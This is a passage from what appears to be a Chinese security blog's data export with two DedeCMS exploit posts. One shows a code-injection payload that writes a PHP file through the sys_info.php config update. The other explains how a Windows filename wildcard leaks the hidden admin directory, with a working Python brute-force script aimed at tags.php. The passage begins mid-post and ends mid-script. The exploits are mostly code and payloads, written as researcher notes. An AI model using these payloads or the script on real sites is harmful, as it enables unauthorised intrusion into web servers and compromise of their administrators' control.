class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'Token mismatch!'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($_POST <span class=\"keyword\">as</span> $k=&gt;$v)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"#^edit___#\"</span>, $k))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            $v = cn_substrR($&#123;$k&#125;, <span class=\"number\">1024</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $k = preg_replace(<span class=\"string\">\"#^edit___#\"</span>, <span class=\"string\">\"\"</span>, $k);</span><br><span class=\"line\">        $dsql-&gt;ExecuteNoneQuery(<span class=\"string\">\"UPDATE `#@__sysconfig` SET `value`='$v' WHERE varname='$k' \"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//更新配置函数</span></span><br><span class=\"line\">    ReWriteConfig();</span><br><span class=\"line\">    ShowMsg(<span class=\"string\">\"成功更改站点配置！\"</span>, <span class=\"string\">\"sys_info.php\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通过<font color=\"red\">foreach($_POST as $k=&gt;$v)</font>接收参数后，更新了数据库，接着进入<font color=\"red\">ReWriteConfig()</font>函数更新配置。</p>\n<ul>\n<li><p>ReWriteConfig</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//更新配置函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ReWriteConfig</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $dsql,$configfile;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!is_writeable($configfile))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"配置文件'&#123;$configfile&#125;'不支持写入，无法修改系统配置参数！\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $fp = fopen($configfile,<span class=\"string\">'w'</span>);</span><br><span class=\"line\">    flock($fp,<span class=\"number\">3</span>);</span><br><span class=\"line\">    fwrite($fp,<span class=\"string\">\"&lt;\"</span>.<span class=\"string\">\"?php\\r\\n\"</span>);</span><br><span class=\"line\">    $dsql-&gt;SetQuery(<span class=\"string\">\"SELECT `varname`,`type`,`value`,`groupid` FROM `#@__sysconfig` ORDER BY aid ASC \"</span>);</span><br><span class=\"line\">    $dsql-&gt;Execute();</span><br><span class=\"line\">    <span class=\"keyword\">while</span>($row = $dsql-&gt;GetArray())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($row[<span class=\"string\">'type'</span>]==<span class=\"string\">'number'</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>($row[<span class=\"string\">'value'</span>]==<span class=\"string\">''</span>) $row[<span class=\"string\">'value'</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            fwrite($fp,<span class=\"string\">\"\\$&#123;$row['varname']&#125; = \"</span>.$row[<span class=\"string\">'value'</span>].<span class=\"string\">\";\\r\\n\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            fwrite($fp,<span class=\"string\">\"\\$&#123;$row['varname']&#125; = '\"</span>.str_replace(<span class=\"string\">\"'\"</span>,<span class=\"string\">''</span>,$row[<span class=\"string\">'value'</span>]).<span class=\"string\">\"';\\r\\n\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    fwrite($fp,<span class=\"string\">\"?\"</span>.<span class=\"string\">\"&gt;\"</span>);</span><br><span class=\"line\">    fclose($fp);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个函数将读取数据库来对配置文件进行更新，但是没有做验证。<font color=\"red\">while($row = $dsql-&gt;GetArray())</font>中有两个分支，这里利用的是第一个分支，当类型为数字型的参数直接写入配置文件。</p>\n<p>接下来只要随便找一个默认数字型的参数就可以了。</p>\n<p>登入后台，在<font color=\"red\">sys_info.php</font>搜索数字型的参数，这里以ftp为例</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2%E5%90%8E%E5%8F%B0sys_info_getshell/001.png\" alt=\"001\"></p>\n</li>\n</ul>\n<p>修改参数为：<font color=\"red\">21;fputs(fopen(“phpinfo.php”, “w”), “<?php phpinfo(); ?>“)</font></p>\n<p>burp包如下</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/002.png\" alt=\"002\"></p>\n<p>查看返回包,修改配置成功</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/003.png\" alt=\"003\"></p>\n<p>生成phpinfo.php</p>\n<p><img src=\"/img/dedecms/dedecms_V5.7_SP2_sys_info_getshell/004.png\" alt=\"004\"></p>\n"},{"title":"dedecms查找后台目录","date":"2019-03-11T03:11:23.000Z","_content":"\n# DEDECMS查找后台目录\n\n## 利用条件：\n\n- Windows系统 \n\n  因为需要用到通配符`<`(或`>`)，来达到以下效果。\n\n  建立两个php文件，5149ff33ebec0e6ad37613ea30694c07.php和demo.php\n\n  内容如下：\n\n  ```php\n  #5149ff33ebec0e6ad37613ea30694c07.php\n  <?php\n  \tphpinfo();\n  ?>\n  ```\n\n ```php\n#demo.php\n<?php\n\t$filename = $_GET[\"file\"];\n\tinclude $filename.\".php\";\n?>\n ```\n\n![001](/img/dedecms/dedecms查找后台目录/001.png)\n\n这里是利用到了windows的FindFirstFile(API),这个API把<<当成通配符来用。而PHP的opendir(win32\\readdir.c)就使用了该API。\n\n- 包含common.inc.php的php文件，如tags.php\n\n- 后台中一张的图片名\n\n\n## 代码逻辑\n\n在common.inc.php的145行\n\n![002](/img/dedecms/dedecms查找后台目录/002.png)\n\nuploadsafe.inc.php\n\n```php\nif( preg_match('#^(cfg_|GLOBALS)#', $_key) )\n    {\n        exit('Request var not allow for uploadsafe!');\n    }\n    $$_key = $_FILES[$_key]['tmp_name'];\n    ${$_key.'_name'} = $_FILES[$_key]['name'];\n    ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\\./]#i', '', $_FILES[$_key]['type']);\n    ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);\n    if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) )\n    {\n        if(!defined('DEDEADMIN'))\n        {\n            exit('Not Admin Upload filetype not allow !');\n        }\n    }\n    if(empty(${$_key.'_size'}))\n    {\n        ${$_key.'_size'} = @filesize($$_key);\n    }\n    \n    $imtypes = array\n    (\n        \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \n        \"image/xpng\", \"image/wbmp\", \"image/bmp\"\n    );\n\n    if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))\n    {\n        $image_dd = @getimagesize($$_key);\n        if (!is_array($image_dd))\n        {\n            exit('Upload filetype not allow !');\n        }\n    }\n```\n\n这一段中<font color=\"red\">$$_key</font>的<font color=\"red\">$key</font>取自<font color=\"red\">$_FILE</font>,是用户可控的,可以传入<font color=\"red\">_FILES[poc][tmp_name]=payload<</images/adminico.gif&_FILES[poc][name]=0&_FILES[poc][size]=0&_FILES[poc][type]=image/gif</font>来查找后台。payload处结合通配符可以节省遍历时间。\n\n结合脚本：\n\n![003](/img/dedecms/dedecms查找后台目录/003.png)\n\n## 脚本\n\n拿红日的脚本改的\n\n```python3\n#!/usr/bin/env python\n#coding:utf-8\n'''/*\n    * env    = python3\n    */\n'''\nimport requests\nimport itertools\nfrom optparse import OptionParser\ncharacters = \"abcdefghijklmnopqrstuvwxyz0123456789_!#\"\n\ndata = {\n    \"_FILES[poc][tmp_name]\" : \"./{p}<</images/adminico.gif\",\n    \"_FILES[poc][name]\" : 0,\n    \"_FILES[poc][size]\" : 0,\n    \"_FILES[poc][type]\" : \"image/gif\"\n}\n\ndef exec(url):\n    back_dir = \"\"\n    flag = 0\n    for num in range(1,7):\n        if flag:\n            break\n        for pre in itertools.permutations(characters,num):\n            pre = ''.join(list(pre))\n            data[\"_FILES[poc][tmp_name]\"] = data[\"_FILES[poc][tmp_name]\"].format(p=pre)\n            print(\"testing\",pre)\n            r = requests.post(url,data=data)\n            if \"Upload filetype not allow !\" not in r.text and r.status_code == 200:\n                flag = 1\n                back_dir = pre\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n                break\n            else:\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n    print(\"[+] 前缀为：\",back_dir)\n    flag = 0\n    for i in range(30):\n        if flag:\n            break\n        for ch in characters:\n            if ch == characters[-1]:\n                flag = 1\n                break\n            data[\"_FILES[poc][tmp_name]\"] = data[\"_FILES[poc][tmp_name]\"].format(p=back_dir+ch)\n            r = requests.post(url, data=data)\n            if \"Upload filetype not allow !\" not in r.text and r.status_code == 200:\n                back_dir += ch\n                print(\"[+] \",back_dir)\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n                break\n            else:\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n    print(\"后台地址为：\",back_dir)\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u','--url',type='string',dest='url',help='Targer URL(e.g. \"https://www.site.com\")')\n    (options, args) = parser.parse_args()\n    if options.url:\n        #目标url\n        url = options.url+\"/tags.php\"\n        exec(url)\n    else:\n        parser.print_help()\nif __name__ == '__main__':\n    main()\n```\n\n","source":"_posts/dedecms查找后台目录.md","raw":"---\ntitle: dedecms查找后台目录\ndate: 2019-03-11 11:11:23\ntags: [cms]\ncategories: dedecms\n---\n\n# DEDECMS查找后台目录\n\n## 利用条件：\n\n- Windows系统 \n\n  因为需要用到通配符`<`(或`>`)，来达到以下效果。\n\n  建立两个php文件，5149ff33ebec0e6ad37613ea30694c07.php和demo.php\n\n  内容如下：\n\n  ```php\n  #5149ff33ebec0e6ad37613ea30694c07.php\n  <?php\n  \tphpinfo();\n  ?>\n  ```\n\n ```php\n#demo.php\n<?php\n\t$filename = $_GET[\"file\"];\n\tinclude $filename.\".php\";\n?>\n ```\n\n![001](/img/dedecms/dedecms查找后台目录/001.png)\n\n这里是利用到了windows的FindFirstFile(API),这个API把<<当成通配符来用。而PHP的opendir(win32\\readdir.c)就使用了该API。\n\n- 包含common.inc.php的php文件，如tags.php\n\n- 后台中一张的图片名\n\n\n## 代码逻辑\n\n在common.inc.php的145行\n\n![002](/img/dedecms/dedecms查找后台目录/002.png)\n\nuploadsafe.inc.php\n\n```php\nif( preg_match('#^(cfg_|GLOBALS)#', $_key) )\n    {\n        exit('Request var not allow for uploadsafe!');\n    }\n    $$_key = $_FILES[$_key]['tmp_name'];\n    ${$_key.'_name'} = $_FILES[$_key]['name'];\n    ${$_key.'_type'} = $_FILES[$_key]['type'] = preg_replace('#[^0-9a-z\\./]#i', '', $_FILES[$_key]['type']);\n    ${$_key.'_size'} = $_FILES[$_key]['size'] = preg_replace('#[^0-9]#','',$_FILES[$_key]['size']);\n    if(!empty(${$_key.'_name'}) && (preg_match(\"#\\.(\".$cfg_not_allowall.\")$#i\",${$_key.'_name'}) || !preg_match(\"#\\.#\", ${$_key.'_name'})) )\n    {\n        if(!defined('DEDEADMIN'))\n        {\n            exit('Not Admin Upload filetype not allow !');\n        }\n    }\n    if(empty(${$_key.'_size'}))\n    {\n        ${$_key.'_size'} = @filesize($$_key);\n    }\n    \n    $imtypes = array\n    (\n        \"image/pjpeg\", \"image/jpeg\", \"image/gif\", \"image/png\", \n        \"image/xpng\", \"image/wbmp\", \"image/bmp\"\n    );\n\n    if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes))\n    {\n        $image_dd = @getimagesize($$_key);\n        if (!is_array($image_dd))\n        {\n            exit('Upload filetype not allow !');\n        }\n    }\n```\n\n这一段中<font color=\"red\">$$_key</font>的<font color=\"red\">$key</font>取自<font color=\"red\">$_FILE</font>,是用户可控的,可以传入<font color=\"red\">_FILES[poc][tmp_name]=payload<</images/adminico.gif&_FILES[poc][name]=0&_FILES[poc][size]=0&_FILES[poc][type]=image/gif</font>来查找后台。payload处结合通配符可以节省遍历时间。\n\n结合脚本：\n\n![003](/img/dedecms/dedecms查找后台目录/003.png)\n\n## 脚本\n\n拿红日的脚本改的\n\n```python3\n#!/usr/bin/env python\n#coding:utf-8\n'''/*\n    * env    = python3\n    */\n'''\nimport requests\nimport itertools\nfrom optparse import OptionParser\ncharacters = \"abcdefghijklmnopqrstuvwxyz0123456789_!#\"\n\ndata = {\n    \"_FILES[poc][tmp_name]\" : \"./{p}<</images/adminico.gif\",\n    \"_FILES[poc][name]\" : 0,\n    \"_FILES[poc][size]\" : 0,\n    \"_FILES[poc][type]\" : \"image/gif\"\n}\n\ndef exec(url):\n    back_dir = \"\"\n    flag = 0\n    for num in range(1,7):\n        if flag:\n            break\n        for pre in itertools.permutations(characters,num):\n            pre = ''.join(list(pre))\n            data[\"_FILES[poc][tmp_name]\"] = data[\"_FILES[poc][tmp_name]\"].format(p=pre)\n            print(\"testing\",pre)\n            r = requests.post(url,data=data)\n            if \"Upload filetype not allow !\" not in r.text and r.status_code == 200:\n                flag = 1\n                back_dir = pre\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n                break\n            else:\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n    print(\"[+] 前缀为：\",back_dir)\n    flag = 0\n    for i in range(30):\n        if flag:\n            break\n        for ch in characters:\n            if ch == characters[-1]:\n                flag = 1\n                break\n            data[\"_FILES[poc][tmp_name]\"] = data[\"_FILES[poc][tmp_name]\"].format(p=back_dir+ch)\n            r = requests.post(url, data=data)\n            if \"Upload filetype not allow !\" not in r.text and r.status_code == 200:\n                back_dir += ch\n                print(\"[+] \",back_dir)\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n                break\n            else:\n                data[\"_FILES[poc][tmp_name]\"] = \"./{p}<</images/adminico.gif\"\n    print(\"后台地址为：\",back_dir)\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u','--url',type='string',dest='url',help='Targer URL(e.g. \"https://www.site.com\")')\n    (options, args) = parser.parse_args()\n    if options.url:\n        #目标url\n        url = options.url+\"/tags.php\"\n        exec(url)\n    else:\n        parser.print_help()\nif __name__ == '__main__':\n    main()\n```\n\n","slug":"dedecms查找后台目录","published":1,"updated":"2019-06-19T17:23:13.383Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istc700134dsbk0l84bzf","content":"<h1 id=\"DEDECMS查找后台目录\"><a href=\"#DEDECMS查找后台目录\" class=\"headerlink\" title=\"DEDECMS查找后台目录\"></a>DEDECMS查找后台目录</h1><h2 id=\"利用条件：\"><a href=\"#利用条件：\" class=\"headerlink\" title=\"利用条件：\"></a>利用条件：</h2><ul>\n<li><p>Windows系统 </p>\n<p>因为需要用到通配符<code>&lt;</code>(或<code>&gt;</code>)，来达到以下效果。</p>\n<p>建立两个php文件，5149ff33ebec0e6ad37613ea30694c07.php和demo.php</p>\n<p>内容如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#5149ff33ebec0e6ad37613ea30694c07.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\tphpinfo();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#demo.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$filename = $_GET[<span class=\"string\">\"file\"</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">include</span> $filename.<span class=\"string\">\".php\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<p><img src=\"/img/dedecms/dedecms%E6%9F%A5%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/001.png\" alt=\"001\"></p>\n<p>这里是利用到了windows的FindFirstFile(API),这个API把&lt;&lt;当成通配符来用。而PHP的opendir(win32\\readdir.c)就使用了该API。</p>\n<ul>\n<li><p>包含common.inc.php的php文件，如tags.php</p>\n</li>\n<li><p>后台中一张的图片名</p>\n</li>\n</ul>\n<h2 id=\"代码逻辑\"><a href=\"#代码逻辑\" class=\"headerlink\" title=\"代码逻辑\"></a>代码逻辑</h2><p>在common.inc.php的145行</p>\n<p><img src=\"/img/dedecms/dedecms%E6%9F%A5%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/002.png\" alt=\"002\"></p>\n<p>uploadsafe.inc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>( preg_match(<span class=\"string\">'#^(cfg_|GLOBALS)#'</span>, $_key) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'Request var not allow for uploadsafe!'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $$_key = $_FILES[$_key][<span class=\"string\">'tmp_name'</span>];</span><br><span class=\"line\">    $&#123;$_key.<span class=\"string\">'_name'</span>&#125; = $_FILES[$_key][<span class=\"string\">'name'</span>];</span><br><span class=\"line\">    $&#123;$_key.<span class=\"string\">'_type'</span>&#125; = $_FILES[$_key][<span class=\"string\">'type'</span>] = preg_replace(<span class=\"string\">'#[^0-9a-z\\./]#i'</span>, <span class=\"string\">''</span>, $_FILES[$_key][<span class=\"string\">'type'</span>]);</span><br><span class=\"line\">    $&#123;$_key.<span class=\"string\">'_size'</span>&#125; = $_FILES[$_key][<span class=\"string\">'size'</span>] = preg_replace(<span class=\"string\">'#[^0-9]#'</span>,<span class=\"string\">''</span>,$_FILES[$_key][<span class=\"string\">'size'</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($&#123;$_key.<span class=\"string\">'_name'</span>&#125;) &amp;&amp; (preg_match(<span class=\"string\">\"#\\.(\"</span>.$cfg_not_allowall.<span class=\"string\">\")$#i\"</span>,$&#123;$_key.<span class=\"string\">'_name'</span>&#125;) || !preg_match(<span class=\"string\">\"#\\.#\"</span>, $&#123;$_key.<span class=\"string\">'_name'</span>&#125;)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!defined(<span class=\"string\">'DEDEADMIN'</span>))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">'Not Admin Upload filetype not allow !'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($&#123;$_key.<span class=\"string\">'_size'</span>&#125;))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $&#123;$_key.<span class=\"string\">'_size'</span>&#125; = @filesize($$_key);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $imtypes = <span class=\"keyword\">array</span></span><br><span class=\"line\">    (</span><br><span class=\"line\">        <span class=\"string\">\"image/pjpeg\"</span>, <span class=\"string\">\"image/jpeg\"</span>, <span class=\"string\">\"image/gif\"</span>, <span class=\"string\">\"image/png\"</span>, </span><br><span class=\"line\">        <span class=\"string\">\"image/xpng\"</span>, <span class=\"string\">\"image/wbmp\"</span>, <span class=\"string\">\"image/bmp\"</span></span><br><span class=\"line\">    );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(in_array(strtolower(trim($&#123;$_key.<span class=\"string\">'_type'</span>&#125;)), $imtypes))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $image_dd = @getimagesize($$_key);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array($image_dd))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">'Upload filetype not allow !'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一段中<font color=\"red\">$$_key</font>的<font color=\"red\">$key</font>取自<font color=\"red\">$_FILE</font>,是用户可控的,可以传入<font color=\"red\">_FILES[poc][tmp_name]=payload&lt;&lt;/images/adminico.gif&amp;_FILES[poc][name]=0&amp;_FILES[poc][size]=0&amp;_FILES[poc][type]=image/gif</font>来查找后台。payload处结合通配符可以节省遍历时间。</p>\n<p>结合脚本：</p>\n<p><img src=\"/img/dedecms/dedecms%E6%9F%A5%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/003.png\" alt=\"003\"></p>\n<h2 id=\"脚本\"><a href=\"#脚本\" class=\"headerlink\" title=\"脚本\"></a>脚本</h2><p>拿红日的脚本改的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\">#coding:utf-8</span><br><span class=\"line\">&apos;&apos;&apos;/*</span><br><span class=\"line\">    * env    = python3</span><br><span class=\"line\">    */</span><br><span class=\"line\">&apos;&apos;&apos;</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import itertools</span><br><span class=\"line\">from optparse import OptionParser</span><br><span class=\"line\">characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;</span><br><span class=\"line\">    &quot;_FILES[poc][tmp_name]&quot; : &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;,</span><br><span class=\"line\">    &quot;_FILES[poc][name]&quot; : 0,</span><br><span class=\"line\">    &quot;_FILES[poc][size]&quot; : 0,</span><br><span class=\"line\">    &quot;_FILES[poc][type]&quot; : &quot;image/gif&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">def exec(url):</span><br><span class=\"line\">    back_dir = &quot;&quot;</span><br><span class=\"line\">    flag = 0</span><br><span class=\"line\">    for num in range(1,7):</span><br><span class=\"line\">        if flag:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        for pre in itertools.permutations(characters,num):</span><br><span class=\"line\">            pre = &apos;&apos;.join(list(pre))</span><br><span class=\"line\">            data[&quot;_FILES[poc][tmp_name]&quot;] = data[&quot;_FILES[poc][tmp_name]&quot;].format(p=pre)</span><br><span class=\"line\">            print(&quot;testing&quot;,pre)</span><br><span class=\"line\">            r = requests.post(url,data=data)</span><br><span class=\"line\">            if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code == 200:</span><br><span class=\"line\">                flag = 1</span><br><span class=\"line\">                back_dir = pre</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">    print(&quot;[+] 前缀为：&quot;,back_dir)</span><br><span class=\"line\">    flag = 0</span><br><span class=\"line\">    for i in range(30):</span><br><span class=\"line\">        if flag:</span><br><span class=\"line\">            break</span><br><span class=\"line\">        for ch in characters:</span><br><span class=\"line\">            if ch == characters[-1]:</span><br><span class=\"line\">                flag = 1</span><br><span class=\"line\">                break</span><br><span class=\"line\">            data[&quot;_FILES[poc][tmp_name]&quot;] = data[&quot;_FILES[poc][tmp_name]&quot;].format(p=back_dir+ch)</span><br><span class=\"line\">            r = requests.post(url, data=data)</span><br><span class=\"line\">            if &quot;Upload filetype not allow !&quot; not in r.text and r.status_code == 200:</span><br><span class=\"line\">                back_dir += ch</span><br><span class=\"line\">                print(&quot;[+] &quot;,back_dir)</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">                break</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                data[&quot;_FILES[poc][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class=\"line\">    print(&quot;后台地址为：&quot;,back_dir)</span><br><span class=\"line\"></span><br><span class=\"line\">def main():</span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(&apos;-u&apos;,&apos;--url&apos;,type=&apos;string&apos;,dest=&apos;url&apos;,help=&apos;Targer URL(e.g. 